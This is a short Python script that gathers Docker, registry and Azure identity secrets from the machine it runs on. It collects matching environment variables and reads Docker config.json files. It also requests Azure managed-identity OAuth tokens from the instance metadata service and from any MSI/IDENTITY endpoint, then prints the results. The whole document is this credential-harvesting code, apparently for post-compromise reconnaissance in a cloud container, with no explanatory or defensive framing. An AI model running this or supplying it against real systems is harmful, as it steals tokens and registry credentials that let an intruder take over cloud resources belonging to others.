
import os, json, subprocess

result = {}
# Get env vars
env_vars = dict(os.environ)
docker_vars = {k:v for k,v in env_vars.items() if "DOCKER" in k.upper() or "REGISTRY" in k.upper() or "IDENTITY" in k.upper() or "MSI" in k.upper()}
result["docker_env"] = docker_vars

# Check docker config
try:
    for path in ["/root/.docker/config.json", "/home/.docker/config.json", "/etc/docker/config.json"]:
        try:
            with open(path) as f:
                result[path] = json.loads(f.read())
        except:
            pass
except Exception as e:
    result["docker_config_error"] = str(e)

# Try IMDS
try:
    import urllib.request
    req = urllib.request.Request(
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        headers={"Metadata": "true"}
    )
    r = urllib.request.urlopen(req, timeout=5)
    result["mi_token"] = json.loads(r.read().decode())
except Exception as e:
    result["mi_error"] = str(e)

# Try MSI env
identity_ep = env_vars.get("IDENTITY_ENDPOINT") or env_vars.get("MSI_ENDPOINT")
identity_secret = env_vars.get("IDENTITY_HEADER") or env_vars.get("MSI_SECRET")
if identity_ep:
    try:
        import urllib.request
        url = f"{identity_ep}?resource=https://management.azure.com/&api-version=2019-08-01"
        req = urllib.request.Request(url, headers={"X-IDENTITY-HEADER": identity_secret or "", "Metadata": "true"})
        r = urllib.request.urlopen(req, timeout=5)
        result["msi_token"] = json.loads(r.read().decode())
    except Exception as e:
        result["msi_error"] = str(e)
else:
    result["msi_env"] = "NO IDENTITY_ENDPOINT/MSI_ENDPOINT"

print(json.dumps(result, indent=2))
